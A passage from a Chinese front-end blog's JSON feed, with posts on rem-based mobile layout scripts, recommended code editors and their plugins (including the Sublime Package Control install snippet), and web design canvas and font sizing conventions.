      "content_html": "<div><p>前言</p>\n<p>解决移动端网页的自适应, 让开发变得更加简洁。</p>\n</div>\n\n<h2 id=\"mate-标签\" tabindex=\"-1\"> mate 标签</h2>\n<div><p>提示</p>\n<p>首先要让页面大小铺满屏幕又不能溢出。只需要在 html 的 head 标签内加入 viewport（如下）, 参数分别表示: 页面宽度＝屏幕宽度, 最大和最小伸缩比都是 1, 不允许用户拉缩。</p>\n</div>\n<div><pre><code><span><span><span>&lt;</span>meta</span>\n  <span>name</span><span><span>=</span><span>\"</span>viewport<span>\"</span></span>\n  <span>content</span><span><span>=</span><span>\"</span>width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no<span>\"</span></span>\n<span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><ul>\n<li><strong>width</strong>: viewport 的宽度, 可以指定为一个像素值, 如: 640, 或者为特殊的值, 如: device-width （设备的宽度）。</li>\n<li><strong>initial-scale</strong>: 初始缩放比例, 即当浏览器第一次加载页面时的缩放比例。值为 1.0 即原始尺寸。</li>\n<li><strong>maximum-scale</strong>: 允许浏览者缩放到的最大比例, 一般设为 1.0, 即原始尺寸。</li>\n<li><strong>minimum-scale</strong>: 允许浏览者缩放到的最小比例, 一般设为 1.0, 即原始尺寸。</li>\n<li><strong>user-scalable</strong>: 浏览者是否可以手动缩放, yes 或 no 。</li>\n</ul>\n<h2 id=\"使用百分比自适应\" tabindex=\"-1\"> 使用百分比自适应</h2>\n<div><p>提示</p>\n<p>把长度单位转换为百分比来表示, 这样在不同的宽度下, 元素的长宽也会随之变化。</p>\n</div>\n<ul>\n<li>优点: 宽度之间无缝衔接, 操作起来也相对比较方便。</li>\n<li>缺点: 字体大小需要另外一套自适应方法来调整；当屏幕宽度大于 <code>700px</code> 后, 继续按照百分比元素会偏大, 这个时候调整起来会比较麻烦。</li>\n</ul>\n<h2 id=\"rem-em-自适应\" tabindex=\"-1\"> rem, em 自适应</h2>\n<div><p>提示</p>\n<p>用媒体查询的方法, 确定在不同屏幕宽度下, 改变 html 或 body 的 font-size。再用 rem , em 替代 px 作为单位实现自适应。</p>\n</div>\n<ul>\n<li>优点: 可以根据不同屏幕宽度来设置, 可以完美解决上面说的屏幕偏大时的比例问题。字体的大小也不存在问题。</li>\n<li>缺点: 根据宽度区间来设置, 无法实现无缝变换。</li>\n</ul>\n<h2 id=\"引入-javascript-代码\" tabindex=\"-1\"> 引入 JavaScript 代码</h2>\n<div><p>提示</p>\n<p>这些兼容方法各有优缺点, 都不算完美, 怎样才能把优点结合在一起, 同时避免缺点呢? 引入 JavaScript 方法源码, 方法原理: 使页面 html 的 font-size 会根据屏幕的宽度自动调整, 而且屏幕宽度和所设字体大小的商是一定的, 然后按照固定比例缩小后作为 rem 的单位长度实现自适应。</p>\n</div>\n<h3 id=\"方法源码一-需引入-jquery\" tabindex=\"-1\"> 方法源码一（需引入 jQuery）</h3>\n<div><pre><code><span>Zepto</span><span>(</span><span>function</span> <span>(</span><span>$</span><span>)</span> <span>{</span>\n  <span>// 获取文档的根节点</span>\n  <span>var</span> doc <span>=</span> document<span>.</span>documentElement<span>;</span>\n\n  <span>function</span> <span>setFontSize</span><span>(</span><span>)</span> <span>{</span>\n    <span>// 获取当前窗口的宽度</span>\n    <span>var</span> winWidth <span>=</span> <span>$</span><span>(</span>window<span>)</span><span>.</span><span>width</span><span>(</span><span>)</span><span>;</span>\n    <span>// 640 宽度以上进行限制</span>\n    <span>var</span> size <span>=</span> <span>(</span>winWidth <span>/</span> <span>640</span><span>)</span> <span>*</span> <span>100</span><span>;</span>\n    doc<span>.</span>style<span>.</span>fontSize <span>=</span> <span>(</span>size <span>&lt;</span> <span>100</span> <span>?</span> size <span>:</span> <span>100</span><span>)</span> <span>+</span> <span>\"px\"</span><span>;</span>\n  <span>}</span>\n\n  <span>// 防止在 html 未加载完毕时执行,保证获取正确的页宽</span>\n  <span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>\n    <span>// 初始化</span>\n    <span>setFontSize</span><span>(</span><span>)</span><span>;</span>\n  <span>}</span><span>,</span> <span>200</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"方法源码二-javascript-原生代码\" tabindex=\"-1\"> 方法源码二（JavaScript 原生代码）</h3>\n<div><pre><code><span>(</span><span>function</span> <span>(</span><span>doc<span>,</span> win</span><span>)</span> <span>{</span>\n  <span>// 获取文档的根节点</span>\n  <span>var</span> docEl <span>=</span> doc<span>.</span>documentElement<span>;</span>\n  <span>// 判断移动端是否发生方向改变</span>\n  <span>var</span> resizeEvt <span>=</span>\n    <span>\"orientationchange\"</span> <span>in</span> window <span>?</span> <span>\"orientationchange\"</span> <span>:</span> <span>\"resize\"</span><span>;</span>\n\n  <span>var</span> <span>recalc</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>\n    <span>// 获取对象的宽度</span>\n    <span>var</span> clientWidth <span>=</span> docEl<span>.</span>clientWidth<span>;</span>\n\n    <span>if</span> <span>(</span><span>!</span>clientWidth<span>)</span> <span>return</span><span>;</span>\n\n    <span>if</span> <span>(</span>clientWidth <span>>=</span> <span>640</span><span>)</span> <span>{</span>\n      docEl<span>.</span>style<span>.</span>fontSize <span>=</span> <span>\"100px\"</span><span>;</span>\n    <span>}</span> <span>else</span> <span>{</span>\n      docEl<span>.</span>style<span>.</span>fontSize <span>=</span> <span>100</span> <span>*</span> <span>(</span>clientWidth <span>/</span> <span>640</span><span>)</span> <span>+</span> <span>\"px\"</span><span>;</span>\n    <span>}</span>\n  <span>}</span><span>;</span>\n\n  <span>if</span> <span>(</span><span>!</span>doc<span>.</span>addEventListener<span>)</span> <span>return</span><span>;</span>\n\n  win<span>.</span><span>addEventListener</span><span>(</span>resizeEvt<span>,</span> recalc<span>,</span> <span>false</span><span>)</span><span>;</span>\n  doc<span>.</span><span>addEventListener</span><span>(</span><span>\"DOMContentLoaded\"</span><span>,</span> recalc<span>,</span> <span>false</span><span>)</span><span>;</span>\n<span>}</span><span>)</span><span>(</span>document<span>,</span> window<span>)</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"常见问题\" tabindex=\"-1\"> 常见问题</h2>\n<div><p>提示</p>\n<p>以上两个方法源码是 rem 布局的核心代码。 如果你的页面不需要引入 jQuery, 建议你使用 JavaScript 原生代码。 代码大意: 如果页面的宽度超过了 640px, 那么页面中 html 的 font-size 恒为 100px, 否则, 页面中 html 的 font-size 的大小为: <code>100 \\ (当前页面宽度 / 640)</code></p>\n</div>\n<h3 id=\"为什么是-640px\" tabindex=\"-1\"> 为什么是 640px?</h3>\n<p>对于手机屏幕来说, <code>640px</code> 的页面宽度是一个安全的最大宽度, 保证了移动端页面两边不会留白。注意这里的 <code>px</code> 是 <code>css</code> 逻辑像素, 与设备的物理像素是有区别的。 如果要切移动端页面, 你可以先把效果图宽度等比例缩放到 <code>640px</code> , 很好用。</p>\n<h3 id=\"为什么要设置-html-的-font-size\" tabindex=\"-1\"> 为什么要设置 html 的 font-size?</h3>\n<p><code>rem</code> 就是根元素（即: <code>html</code> ）的字体大小。 <code>html</code> 中的所有标签样式凡是涉及到尺寸的（如: <code>height</code> , <code>width</code> , <code>padding</code> , <code>margin</code> , <code>font-size</code> 。甚至 <code>left</code> , <code>top</code> 等）你都可以放心大胆的用 <code>rem</code> 作单位。 如果你把 <code>html</code> 的 <code>font-size</code> 设为 <code>20px</code> , 前面说过, <code>rem</code> 就是 <code>html</code> 的字体大小, 那么 <code>1rem = 20px</code> 。</p>\n<h3 id=\"模拟为什么要使用-iphone-4\" tabindex=\"-1\"> 模拟为什么要使用 iphone 4?</h3>\n<p>假设你部门的设计师给你的页面标准宽度为 <code>640px</code> , 则页面中所有的 <code>宽高</code> 全部除以 2 , Chrome 浏览器 模拟手机页面 设置手机型号为 <code>IPhone 4</code> 。 这也就是为什么要将所有的宽高除以 2 的原因: <code>IPhone 4</code> 标准 宽 是 <code>320 px</code> 。 然后正常的用 <code>px</code> 为单位 写你的 <code>css</code> , 你所需要做的就是你写的页面, 要在 <code>IPhone 4</code> 完全正确显示。 如果你说, 那设计那边给的不是 <code>640px</code> 标准怎么办? 你只要让你的页面按照设计图在 <code>iphone 4</code> 上正确显示, 就木问题。</p>\n<h3 id=\"rem-单位是如何换算的\" tabindex=\"-1\"> rem 单位是如何换算的?</h3>\n<p>页面 <code>css</code> 全部写完之后, 将所有的 <code>px</code> 转换为以 <code>rem</code> 为单位的数字。 例如 我设置 <code>body</code> 的 <code>width: 320px；</code> 则根据设置的 <code>font - size</code> 值, 转换为 <code>rem</code> , 则是 <code>width: 16 rem；</code> 【320 / 20 (你设置的标准 <code>font - size</code> ) = 16】。</p>\n<h3 id=\"如何使用插件换算\" tabindex=\"-1\"> 如何使用插件换算?</h3>\n<p>如果你说一个页面的 <code>css</code> 有几百行, 写完再去改太麻烦了, 那可以用 <code>px</code> 转换成 <code>rem</code> 的插件。 我这里有一款推荐: <code>cssrem</code> （下载使用网址 <a href=\"http://github.com/flashlizi/cssrem\" target=\"_blank\" rel=\"noopener noreferrer\">cssrem</a>）。 该插件是 <code>sublime text</code> 的一款插件。<br></p>\n<p><img src=\"/assets/layout-moblie.gif\" alt=\"cssrem\"></p>\n",
      "image": "https://vxhly.github.io/assets/layout-moblie.gif",
      "date_published": "2016-08-13T19:40:34.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "design"
      ]
    },
    {
      "title": "需要一款称手的编辑器",
      "url": "https://vxhly.github.io/views/design/need-a-super-software.html",
      "id": "https://vxhly.github.io/views/design/need-a-super-software.html",
      "summary": "前言\n以下介绍的编辑器是跨平台, 无论是 Windows, 还是 Liunx, 甚至是 Mac, 都可以成为程序员称手的利器。\n\n",
      "content_html": "<div><p>前言</p>\n<p>以下介绍的编辑器是跨平台, 无论是 Windows, 还是 Liunx, 甚至是 Mac, 都可以成为程序员称手的利器。</p>\n</div>\n\n<h2 id=\"atom\" tabindex=\"-1\"> Atom</h2>\n<p>开源。功能强大, 是 Github 团队推出的简洁编辑器, 自带 <code>Node.js</code> 环境。</p>\n<h3 id=\"下载地址\" tabindex=\"-1\"> 下载地址</h3>\n<p>官网下载地址: <a href=\"http://github.com/atom/atom/releases\" target=\"_blank\" rel=\"noopener noreferrer\">Atom</a><br> 官网下载地址下不下来点击以下链接下载: <a href=\"http://oss-blog.test.upcdn.net/atom-amd64.deb?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">atom-amd64.deb</a> <a href=\"http://oss-blog.test.upcdn.net/AtomSetup.exe?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">AtomSetup.exe</a></p>\n<h3 id=\"安装插件\" tabindex=\"-1\"> 安装插件</h3>\n<p>使用 <code>Ctrl+,</code> 调出设置页面, 在 <code>install</code> 中查询插件并安装。自带 <code>Node.js</code> 环境。部分插件支持自定义设置。</p>\n<h3 id=\"插件推荐\" tabindex=\"-1\"> 插件推荐</h3>\n<ul>\n<li><strong>emmet</strong> =&gt; 前端开发者必备</li>\n<li><strong>atom-beautify</strong> =&gt; 格式化编程语言文件, 支持的语法较广, 如 <code>PHP</code> 、 <code>Python</code> 、 <code>Ruby</code> 、 <code>Java</code> 、 <code>C</code> 等</li>\n<li><strong>atom-html-perview</strong> =&gt; <code>html</code> 文件实时预览</li>\n<li><strong>atom-minify</strong> =&gt; 压缩 <code>Html</code> 、 <code>CSS</code> 文件</li>\n<li><strong>autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li>\n<li><strong>csscomb</strong> =&gt; <code>CSS</code> 属性自动排序</li>\n<li><strong>docblockr</strong> =&gt; 可以自动生成 <code>PHPDoc</code> 风格的注释</li>\n<li><strong>atom-ternjs</strong> =&gt; <code>javascript</code> 代码提示</li>\n<li><strong>autocomplete-paths</strong> =&gt; 引入文件时, 自动补全路径</li>\n<li><strong>language-markdown</strong> =&gt; <code>markdown</code> 文件语法高亮</li>\n<li><strong>language-vue</strong> =&gt; <code>vue</code> 文件语法高亮</li>\n<li><strong>logo-file-icons</strong> =&gt; 文件图标</li>\n<li><strong>markdown-scroll-sync</strong> =&gt; <code>markdown</code> 文件预览自动滚动</li>\n<li><strong>simplified-chinese-menu</strong> =&gt; <code>Atom</code> 简体中文语言包</li>\n<li><strong>vue-autocomplete</strong> =&gt; <code>vue</code> 文件代码自动提示</li>\n<li><strong>vue-format</strong> =&gt; <code>vue</code> 文件自动格式化</li>\n<li><strong>sync-settings</strong> =&gt; atom 插件备份(需要 Githunb Access Token 和 Gist Id)</li>\n</ul>\n<h2 id=\"brackets\" tabindex=\"-1\"> Brackets</h2>\n<p>开源。功能强大, 是一个非常优秀的 <code>WEB</code> 设计和前端开发的源代码编辑器。当然也支持 <code>C</code> 、 <code>Java</code> 、 <code>Python</code> 等编程语言。支持实时预览。自带 <code>Node.js</code> 环境。</p>\n<h3 id=\"下载地址-1\" tabindex=\"-1\"> 下载地址</h3>\n<p><a href=\"http://github.com/adobe/brackets/releases\" target=\"_blank\" rel=\"noopener noreferrer\">Brackets</a><br> 官网下载地址下不下来点击以下链接下载: <a href=\"http://oss-blog.test.upcdn.net/Brackets.Release.1.8.msi?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">Brackets. Release.1.8.msi</a><br> <a href=\"http://oss-blog.test.upcdn.net/Brackets.Release.1.8.64-bit.deb?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">Brackets. Release.1.8.64-bit.deb</a></p>\n<h3 id=\"安装插件-1\" tabindex=\"-1\"> 安装插件</h3>\n<p>部分插件是使用国外源的, 很容易被墙的。所以系统最好要有个代理服务器, 这里推荐 <a href=\"http://www.gaotizi.com/aff.php?aff=133\" target=\"_blank\" rel=\"noopener noreferrer\">高梯子</a>。</p>\n<h3 id=\"如何安装\" tabindex=\"-1\"> 如何安装</h3>\n<p>最快速的安装 <code>Bracket</code> s 扩展的方法是使用扩展管理器（ <code>Extension Manager</code> ）– 直接在 <code>Brackets</code> 的工具栏选择 <code>File &gt; Extension Manager</code> 即可。</p>\n<h3 id=\"修改界面语言\" tabindex=\"-1\"> 修改界面语言</h3>\n<p>改成中文。 Debug-&gt;Switch Language</p>\n<h3 id=\"插件推荐-1\" tabindex=\"-1\"> 插件推荐</h3>\n<ul>\n<li><strong>Emmet</strong> =&gt; 前端开发者必备</li>\n<li><strong>Autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li>\n<li><strong>CSScomb</strong> =&gt; <code>CSS</code> 属性自动排序</li>\n<li><strong>Brackets Icons</strong> =&gt; 为你的 <code>Brackets</code> 边栏添加文件图标</li>\n<li><strong>Brackets CSS Class Code hint</strong> =&gt; 输入 <code>class</code> 或 <code>id</code> 时会出现 <code>css</code> 里面的 <code>class／id</code></li>\n<li><strong>JS CSS Minifier</strong> =&gt; 压缩 <code>JS</code> 和 <code>CSS</code> 文件</li>\n<li><strong>Beautify</strong> =&gt; 这个扩展可以让你的 <code>HTML</code> 、 <code>CSS</code> 、 <code>JavaScript</code> 等代码格式化一致, 从而提升可读性</li>\n<li><strong>Simple To-Do</strong> =&gt; 使用 <code>Simple To-Do</code> 可以确保你不会忘记项目的任务。它允许你在 <code>Brackets</code> 中为每一个项目创建 <code>TODO</code> 列表。</li>\n<li><strong>Markdown Preview</strong> =&gt; <code>Markdown</code> 文件实时预览</li>\n<li><strong>Markdown Toolbar</strong> =&gt; <code>Markdown</code> 文件的快捷工具栏</li>\n<li><strong>JavaScript Globals</strong> =&gt; <code>javascript</code> 全局变量高亮</li>\n<li><strong>Brackets Vue</strong> =&gt; <code>Vue</code> 文件语法高亮</li>\n</ul>\n<h2 id=\"sublime-text-3\" tabindex=\"-1\"> Sublime Text 3</h2>\n<p>非开源。功能强大, 可以编译 <code>C</code> 、 <code>Java</code> 、 <code>Python</code> 等编程语言。 <code>Liunx</code> 下启动可以在终端输入 <code>subl</code> 。部分插件依赖于 <code>Node.js</code> 。</p>\n<h3 id=\"下载地址-2\" tabindex=\"-1\"> 下载地址</h3>\n<p>官网下载地址: <a href=\"http://www.sublimetext.com/3\" target=\"_blank\" rel=\"noopener noreferrer\">Sublime Text 3</a><br> 官网下载地址下不下来点击以下链接下载: <a href=\"http://oss-blog.test.upcdn.net/Sublime%20Text%20Build%203126%20Setup.exe?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">Sublime Text Build 3126 Setup.exe</a><br> <a href=\"http://oss-blog.test.upcdn.net/Sublime%20Text%20Build%203126%20x64%20Setup.exe?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">Sublime Text Build 3126 x64 Setup.exe</a></p>\n<h3 id=\"安装插件-2\" tabindex=\"-1\"> 安装插件</h3>\n<h3 id=\"直接安装\" tabindex=\"-1\"> 直接安装:</h3>\n<p>安装 Sublime text 3 插件很方便, 可以直接下载安装包解压缩到 Packages 目录（菜单-&gt;preferences-&gt;packages）</p>\n<h3 id=\"使用-package-control-安装\" tabindex=\"-1\"> 使用 Package Control 安装</h3>\n<p>按 <code>Ctrl+</code> 调出 <code>console</code> 粘贴以下代码到底部命令行并回车:</p>\n<div><pre><code><span>import</span> urllib<span>.</span>request<span>,</span> os<span>;</span>\npf <span>=</span> <span>'Package Control.sublime-package'</span><span>;</span>\nipp <span>=</span> sublime<span>.</span><span>installed_packages_path</span><span>(</span><span>)</span><span>;</span>\nurllib<span>.</span>request<span>.</span><span>install_opener</span><span>(</span>urllib<span>.</span>request<span>.</span><span>build_opener</span><span>(</span>urllib<span>.</span>request<span>.</span><span>ProxyHandler</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>\n<span>open</span><span>(</span>os<span>.</span>path<span>.</span><span>join</span><span>(</span>ipp<span>,</span> pf<span>)</span><span>,</span> <span>'wb'</span><span>)</span><span>.</span><span>write</span><span>(</span>urllib<span>.</span>request<span>.</span><span>urlopen</span><span>(</span><span>'http://sublime.wbond.net/'</span> <span>+</span> pf<span>.</span><span>replace</span><span>(</span><span>' '</span><span>,</span> <span>'%20'</span><span>)</span><span>)</span><span>.</span><span>read</span><span>(</span><span>)</span><span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>重启 <code>Sublime Text 3</code> 。 如果在 <code>Perferences</code> -&gt; <code>package settings</code> 中看到 <code>package control</code> 这一项, 则安装成功。 顺便贴下 Sublime Text2 的代码。</p>\n<div><pre><code><span>import</span> urllib2<span>,</span> os<span>;</span>\npf <span>=</span> <span>'Package Control.sublime-package'</span><span>;</span>\nipp <span>=</span> sublime<span>.</span><span>installed_packages_path</span><span>(</span><span>)</span><span>;</span>\nos<span>.</span><span>makedirs</span><span>(</span>ipp<span>)</span> <span>if</span> not os<span>.</span>path<span>.</span><span>exists</span><span>(</span>ipp<span>)</span>\n<span>else</span> None<span>;</span>\nurllib2<span>.</span><span>install_opener</span><span>(</span>urllib2<span>.</span><span>build_opener</span><span>(</span>urllib2<span>.</span><span>ProxyHandler</span><span>(</span><span>)</span><span>)</span><span>)</span><span>;</span>\n<span>open</span><span>(</span>os<span>.</span>path<span>.</span><span>join</span><span>(</span>ipp<span>,</span> pf<span>)</span><span>,</span> <span>'wb'</span><span>)</span><span>.</span><span>write</span><span>(</span>urllib2<span>.</span><span>urlopen</span><span>(</span><span>'http://sublime.wbond.net/'</span> <span>+</span> pf<span>.</span><span>replace</span><span>(</span><span>' '</span><span>,</span> <span>'%20'</span><span>)</span><span>)</span><span>.</span><span>read</span><span>(</span><span>)</span><span>)</span><span>;</span>\n<span>print</span><span>(</span><span>'Please restart Sublime Text to finish installation'</span><span>)</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"用组件安装插件的方法\" tabindex=\"-1\"> 用组件安装插件的方法:</h3>\n<ol>\n<li>按下 <code>Ctrl+Shift+P</code> 调出命令面板</li>\n<li>输入 <code>install</code> 调出 Install Package 选项并回车, 然后在列表中选中要安装的插件。</li>\n</ol>\n<h3 id=\"注意\" tabindex=\"-1\"> 注意</h3>\n<p>国内使用 <code>Sublime Text 3</code> , 经常可能遇到无法安装可用插件问题, 可 <code>remove</code> 掉 <code>Package Control</code> 重新安装下；如遇到连 <code>Package Control</code> 也无法安装, 则可以在别处拷贝一份关于 <code>Package Control</code> 的文件( <code>Package Control.sublime-package</code> )存放于 <code>Installed Packages</code> 目录之下即可</p>\n<h3 id=\"插件推荐-2\" tabindex=\"-1\"> 插件推荐</h3>\n<ul>\n<li><strong>Emmet</strong> =&gt; 前端开发者必备</li>\n<li><strong>Autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li>\n<li><strong>CSScomb</strong> =&gt; <code>CSS</code> 属性自动排序</li>\n<li><strong>JsFormat</strong> =&gt; 一个 <code>JS</code> 代码格式化插件</li>\n<li><strong>Tag</strong> =&gt; 格式化 <code>Html/Xml</code> 代码</li>\n<li><strong>phpFormat</strong> =&gt; 格式化 <code>php</code> 代码</li>\n<li><strong>HTML-CSS-JS Prettify</strong> =&gt; 一款集成了格式化（美化）html、css、js 三种文件类型的插件, 依赖于 <code>Node.js</code></li>\n<li><strong>Minify</strong> =&gt; 自动压缩 <code>JS</code> 、 <code>CSS</code> 文件</li>\n<li><strong>ColorPicker</strong> =&gt; 颜色选择器</li>\n<li><strong>BracketHighlighter</strong> =&gt; 类似于代码匹配, 可以匹配括号, 引号等符号内的范围</li>\n<li><strong>SublimeCodeIntel</strong> =&gt; 代码自动提示</li>\n<li><strong>SublimeLinter</strong> =&gt; 用于高亮提示用户编写的代码中存在的不规范和错误的写法</li>\n<li><strong>DocBlockr</strong> =&gt; 可以自动生成 <code>PHPDoc</code> 风格的注释</li>\n<li><strong>ChineseLocalizations</strong> =&gt; 汉化 <code>Sublime Text</code></li>\n<li><strong>MarkDownEditing</strong> =&gt; <code>markdown</code> 文件语法高亮</li>\n<li><strong>vue Syntax Highlight</strong> =&gt; <code>vue</code> 文件语法高亮</li>\n</ul>\n<h2 id=\"visual-studio-code\" tabindex=\"-1\"> Visual Studio Code</h2>\n<p>微软开发的一款编辑器, 免费而且跨平台, 可以编写 <code>C</code> 、 <code>Java</code> 、 <code>Python</code> 等代码, 在界面上与 Sublime Text 非常相似</p>\n<h3 id=\"下载地址-3\" tabindex=\"-1\"> 下载地址</h3>\n<p>官网下载地址: <a href=\"http://code.visualstudio.com/Download\" target=\"_blank\" rel=\"noopener noreferrer\">VS code</a></p>\n<h3 id=\"安装插件-3\" tabindex=\"-1\"> 安装插件</h3>\n<p>使用 <code>Ctrl + Shift + X</code> 调出安装插件界面</p>\n<h3 id=\"插件推荐-3\" tabindex=\"-1\"> 插件推荐</h3>\n<ul>\n<li><strong>HTML Snippets</strong> =&gt; 超级实用且初级的 <code>H5</code> 代码片段以及提示</li>\n<li><strong>HTML CSS Support</strong> =&gt; 让 <code>html</code> 标签上写 class 智能提示当前项目所支持的样式</li>\n<li><strong>Debugger for Chrome</strong> =&gt; 让 vscode 映射 chrome 的 debug 功能, 静态页面都可以用 vscode 来打断点调试</li>\n<li><strong>vscode-icons</strong> =&gt; 让 vscode 资源树目录加上图标</li>\n<li><strong>Path Intellisense</strong> =&gt; 自动路劲补全, 默认不带这个功能的</li>\n<li><strong>Document this</strong> =&gt; js 的注释模板</li>\n<li><strong>ESlint</strong> =&gt; 代码规范性检查</li>\n<li><strong>vetur</strong> =&gt; <code>vue</code> 语法高亮</li>\n<li><strong>Git Easy</strong> =&gt; <code>git</code> 管理</li>\n</ul>\n",
      "date_published": "2016-08-07T16:49:47.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "design"
      ]
    },
    {
      "title": "网页设计规范-网页设计稿尺寸",
      "url": "https://vxhly.github.io/views/design/web-design-specification.html",
      "id": "https://vxhly.github.io/views/design/web-design-specification.html",
      "summary": "前言\n最近为了适配多平台、多分辨率甚是烦恼, 先不说代码写的对不对, 是不是完美的, 这次就先从源头(UI 设计稿)抓一抓吧, 这里举例的是某宝的设计团队多年的经验, 作为借鉴引用给前端工作人员以及 UI 设计师们。\n\n",
      "content_html": "<div><p>前言</p>\n<p>最近为了适配多平台、多分辨率甚是烦恼, 先不说代码写的对不对, 是不是完美的, 这次就先从源头(UI 设计稿)抓一抓吧, 这里举例的是某宝的设计团队多年的经验, 作为借鉴引用给前端工作人员以及 UI 设计师们。</p>\n</div>\n\n<h2 id=\"痛点\" tabindex=\"-1\"> 痛点</h2>\n<p>虽然 H5 的页面与 PC 的 Web 页面相比简单了不少, 但让我们头痛的事情是要想尽办法让页面能适配众多不同的终端设备。看看下图你就会知道, 这是多么痛苦的一件事情:</p>\n<p><img src=\"/assets/web-design-1.png\" alt=\"web-design-1\"></p>\n<h2 id=\"手淘团队适配协作模式\" tabindex=\"-1\"> 手淘团队适配协作模式</h2>\n<p>早期移动端开发, 对于终端设备适配问题只属于 Android 系列, 只不过很多设计师常常忽略 Android 适配问题, 只出一套 iOS 平台设计稿。但随着 iPhone6, iPhone6+的出现, 从此终端适配问题不再是 Android 系列了, 也从这个时候让移动端适配全面进入到“杂屏”时代。</p>\n<p><img src=\"/assets/web-design-2.png\" alt=\"web-design-2\"></p>\n<p>上图来自于 <a href=\"http://www.paintcodeapp.com/news/ultimate-guide-to-iphone-resolutions\" target=\"_blank\" rel=\"noopener noreferrer\">paintcodeapp.com</a></p>\n<p>为了应对这多么的终端设备, 设计师和前端开发之间又应该采用什么协作模式? 或许大家对此也非常感兴趣。</p>\n<p>而整个手淘设计师和前端开发的适配协作基本思路是:</p>\n<ul>\n<li>选择一种尺寸作为设计和开发基准</li>\n<li>定义一套适配规则, 自动适配剩下的两种尺寸(其实不仅这两种, 你懂的)</li>\n<li>特殊适配效果给出设计效果</li>\n</ul>\n<p>还是上一张图吧, 因为一图胜过千言万语:</p>\n<p><img src=\"/assets/web-design-3.jpg\" alt=\"web-design-3\"></p>\n<p>在此也不做更多的阐述。在手淘的设计师和前端开发协作过程中: 手淘设计师常选择 iPhone6 作为基准设计尺寸, 交付给前端的设计尺寸是按 750px * 1334px 为准(高度会随着内容多少而改变)。前端开发人员通过一套适配规则自动适配到其他的尺寸。著作权归作者所有。</p>\n<h2 id=\"移动端-h5-设计稿尺寸\" tabindex=\"-1\"> 移动端 H5 设计稿尺寸</h2>\n<p>移动端 H5 尺寸 设计移动端 H5 项目的时候, 我们一般以用户量较高的 iPhone6/7/8 的尺寸: 750x1334px 为准, 然后我们要在顶部预留出微信或者浏览器导航区域。主要内容区域就可以自由设计了。一般 H5 的操作是上下滑动。字体方面使用苹方字体, 并且字号设置为 24PX 以上, 渲染方式设置成锐利。英文则需要使用 SF-UI 代替。当然 H5 可以调用背景音乐、视频、链接等多媒体, 让体验更佳。除了让前端小哥哥们开发之外, 其实还有一种方式可以无需代码生成简易版的 H5, 就是通过 H5 工具生成。目前比较火的 H5 生成工具有: MAKA、iH5、兔展等, 如果我们要自己生成而不是通过前端开发, 那么我们设计稿的尺寸需要设置为 640x1008PX。这些工具较为简单, 注册后将 PSD 上传即可对每个原件进行动效的设置了。但是如果需要复杂的动效和交互, 还是需要前端工程师的配合。</p>\n<h2 id=\"电脑-web-页-banner-设计稿尺寸\" tabindex=\"-1\"> 电脑 Web 页 Banner 设计稿尺寸</h2>\n<p>Banner 的宽度有两种, 一种是满屏（1920PX）、一种是基于安全距离的满尺寸（1200px 或 1000px）。高度要注意了: 一般以 1920x1080px 为基准的用户屏幕, 加上浏览器本身与插件和底部工具条等距离, 留给网站的一屏高度大概为 900px, 所以 banner 不可以做得很高, 否则第一屏信息会显示得不够。你可能会说, 那就让用户往下拉啊。但是在网站的访问用户之中, 第二屏触及到的用户比第一屏会少很多。也就是很多用户可能点击网站后就会跳走或者关闭, 那么第一屏的信息真的非常重要了, 可谓是寸土寸金。所以我们的 banner 不应该占据过大的区域。比如站酷网的 Banner 区域为 1380x350px。</p>\n<h2 id=\"画板尺寸\" tabindex=\"-1\"> 画板尺寸</h2>\n<p>因为网页尺寸与用户屏幕相关, 而用户屏幕的种类难以统计。所以我们的设计稿只能主要顾及主流用户的分辨率, 其他分辨率用适配的方式来解决。在最新版 Photoshop 网站 Web 预设尺寸给了我们一些启示: 常见尺寸（1366x768px）、大网页（1920x1080px）、最小尺寸（1024x768px）、Macbook Pro13 （2560x1600px）、MacBook Pro15（2880x1800px）、iMac 27（2560x1440px）等。这些是主流尺寸, 而我们如果做网站时建议按主流的分辨率 1920x1080px 来设计。所以我们通常设计网站时的网站宽度为 1920px, 每个屏幕的高度约为 900px。为什么是 900px 呢? 因为 1080 还要减去浏览器头部和底部高度, 大约就是 900px 了。内容安全区域为 1200px （或 1000px / 1400px）。以这个尺寸来设计相对标准。当然在设计网页前需要知会前端设计尺寸, 因为对于适配的方式和后续配合他们更有发言权。</p>\n<h2 id=\"web-字体要求\" tabindex=\"-1\"> web 字体要求</h2>\n<p>在网站设计中我们的文字大小一般来说是 12-20 像素。为什么不能比 12px 更小? 因为如果比 12 像素更小的中文无法放得下复杂的笔画了。而且奇数的文字表现和适配都不好做, 